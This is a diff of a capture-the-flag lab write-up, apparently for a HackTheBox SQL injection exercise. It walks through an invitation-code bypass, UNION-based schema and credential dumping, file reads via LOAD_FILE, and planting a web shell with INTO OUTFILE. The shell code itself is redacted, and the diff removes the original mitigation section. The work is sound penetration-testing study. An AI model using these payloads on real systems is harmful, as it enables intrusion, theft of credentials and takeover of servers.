@@ -7,7 +7,7 @@
 
 ---
 
-![CPTS SQLi Banner](assets/images/sqli-1.png)
+![CPTS SQLi Banner](assets/images/sqli-10.png)
 
 ## Overview
 
@@ -19,9 +19,17 @@ The target application contains an endpoint susceptible to SQL Injection vulnera
 
 ## 1. Initial Reconnaissance & Enumeration
 
-![Target Web Application](assets/images/sqli-2.png)
+I first tested the **login form** for SQL injection using several authentication bypass payloads, but none of them appeared to be vulnerable.
 
-Upon navigating to the target web application, we encounter a search interface and a user login panel. We begin by testing user input fields for SQL injection payloads.
+Since authentication wasn’t possible, I moved on to the **registration page**.
+
+While attempting to register an account, the application required an invitation code.
+
+- Intercepted the registration request using **Burp Suite** after entering random characters in the invitation code.
+
+![Target Web Application](assets/images/sqli-1.png)
+
+- After testing several SQL injection payloads, I found that the `invitationCode` parameter was vulnerable and I bypassed it using this payload:
 
 ```sql
 ' OR '1'='1
@@ -29,96 +37,162 @@ Upon navigating to the target web application, we encounter a search interface a
 " OR "1"="1
 ```
 
-Testing input parameters on the search field returns database error messages, confirming an unhandled SQL error:
+Now We have an account !!
 
-```text
-Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''...'
-```
+![Target Web Application](assets/images/sqli-2.png)
 
 ---
 
 ## 2. Determining Column Count & Database Layout
 
+After logging in, I reached the chat application.
+
+The application contained:
+- A search bar
+- A message box
+- A list of conversations
+
 ![ORDER BY Injection Test](assets/images/sqli-3.png)
 
-To perform a successful `UNION` based injection, we first need to determine the number of columns returned by the original query using `ORDER BY`:
+The vulnerable endpoint was the **search field**.
+
+- **Column Enumeration:** Determined the number of columns using `UNION SELECT`:
 
 ```sql
-' ORDER BY 1-- -
-' ORDER BY 2-- -
-' ORDER BY 3-- -
-' ORDER BY 4-- -
-' ORDER BY 5-- -  <-- Error: Unknown column '5'
-```
-
-This confirms the original query retrieves **4 columns**. Next, we find which columns reflect input back to the response page:
-
-```sql
-' UNION SELECT 1, 2, 3, 4-- -
+admin') UNION SELECT 1, 2, 3, 4-- -
 ```
 
 ![Reflective Columns Found](assets/images/sqli-4.png)
 
-Columns `2` and `3` are rendered on the screen.
+Observation: Columns 3 and 4 reflected output back onto the page layout.
 
 ---
 
 ## 3. Enumerating Database Name, Version & Tables
 
+Using the UNION vulnerability on columns 3 and 4, the database schema was dumped.
+
+### 1. Enumerating Databases
+
+```sql
+admin') UNION SELECT 1,2,schema_name,4 
+FROM INFORMATION_SCHEMA.SCHEMATA-- -
+```
+
+Found: `information_schema`, `chattr`
+
+### 2. Enumerating Tables in chattr
+
+```sql
+admin') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA 
+FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA ='chattr'-- -
+```
+**Found Tables:** `Users`, `InvitationCodes`, `Messages`
+
+### 3. Enumerating Columns in Users
+
+```sql
+admin') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME 
+FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ='Users'-- -
+```
+**Found Columns:** `UserID`, `Username`, `Password`, `InvitationCode`, `AccountCreated`
+
+### 4. Dumping User Credentials
+
+```sql
+admin') UNION SELECT 1,2,Username,Password FROM chattr.Users;-- -
+```
+**Extracted Hashes:** Retrieved password hashes for users including `admin`, `bmdyy`, and `dev` (stored as argon2 hashes).
+
 ![Database Version & Name Dump](assets/images/sqli-5.png)
 
-With reflective columns identified, we extract system information:
-
-```sql
-' UNION SELECT 1, @@version, database(), 4-- -
-```
-
-* **Database Version:** `10.5.15-MariaDB-0+deb11u1`
-* **Current Database:** `main_db`
-
-Next, we dump all table names from `information_schema`:
-
-![Dumping Table Names](assets/images/sqli-6.png)
-
-```sql
-' UNION SELECT 1, group_concat(table_name), 3, 4 FROM information_schema.tables WHERE table_schema=database()-- -
-```
-
-**Results:**
-* `users`
-* `flag_storage`
-* `config`
-
 ---
 
-## 4. Extracting the Flag & Credentials
+## 4. File Operations — The Web Root Path
 
-![Inspecting Columns](assets/images/sqli-7.png)
-
-We inspect the columns inside the target table `flag_storage`:
+To determine what permissions the database user had, I first identified the current user:
 
 ```sql
-' UNION SELECT 1, group_concat(column_name), 3, 4 FROM information_schema.columns WHERE table_name='flag_storage'-- -
+admin') UNION SELECT 1,2,CURRENT_USER(),4-- -
 ```
 
-**Columns:** `id`, `flag_code`, `created_at`
-
-Finally, we query the secret flag:
-
-![Retrieving Flag](assets/images/sqli-8.png)
-
-```sql
-' UNION SELECT 1, flag_code, 3, 4 FROM flag_storage-- -
-```
+**Output:**
 
 ```text
-HTB{sqli_m4st3r_cpts_fund4m3nt4ls_2026!}
+chattr_dbUser@localhost
+```
+
+Next, I enumerated the granted privileges:
+
+```sql
+admin') UNION
+SELECT 1,2,grantee,privilege_type
+FROM information_schema.user_privileges-- -
+```
+
+![Database User Privileges](assets/images/sqli-6.png)
+
+The database user possessed the **FILE** privilege.
+
+This is particularly interesting because it allows reading and writing files on the server using `LOAD_FILE()` and `INTO OUTFILE`.
+
+I first retrieved the Nginx configuration:
+
+```sql
+admin') UNION
+SELECT 1,2,LOAD_FILE('/etc/nginx/nginx.conf'),4-- -
+```
+
+The configuration revealed that virtual host configurations were loaded from:
+
+```text
+/etc/nginx/sites-enabled/*
+```
+
+![Nginx Config](assets/images/sqli-7.png)
+
+I then read the default virtual host configuration:
+
+```sql
+admin') UNION
+SELECT 1,2,LOAD_FILE('/etc/nginx/sites-enabled/default'),4-- -
+```
+
+![Virtual Host Config](assets/images/sqli-8.png)
+
+From this file I discovered the web root:
+
+```text
+/var/www/chattr-prod
 ```
 
 ---
 
-## Key Takeaways & Mitigation
+## 5. Remote Code Execution (RCE) — The Flag
 
-1. **Parameterization:** Always use prepared statements with parameterized queries (`PDO` or `mysqli_stmt` in PHP).
-2. **Error Handling:** Disable verbose database error messages in production environments.
-3. **Principle of Least Privilege:** Ensure database accounts used by web applications have strictly scoped permissions (e.g., disable `LOAD_FILE` and `INTO OUTFILE` if not explicitly necessary).
+- **Verifying File Write Access:** Before attempting code execution, I verified that the database user could create files inside the web root:
+
+```sql
+admin') UNION 
+SELECT "","","file written successfully!","" 
+INTO OUTFILE '/var/www/chattr-prod/proof.txt'-- -
+```
+
+And it worked!
+
+- **Writing a Web Shell:** Leveraging the MySQL `INTO OUTFILE` capability and the `FILE` privilege, a web shell script was written directly into the web root:
+
+```sql
+admin') UNION SELECT "", "", "[PHP_EXEC_PAYLOAD]", "" 
+INTO OUTFILE '/var/www/chattr-prod/cmd.php';-- -
+```
+
+- **Executing Commands & Capturing the Flag:**
+Navigated to the newly created shell and ran searches to locate flags:
+
+```bash
+find / -name "*.txt" 2>/dev/null
+```
+**FOUND THE FLAG IN:** `/flag_876a4c.txt`
+
+![Flag Captured](assets/images/sqli-9.png)
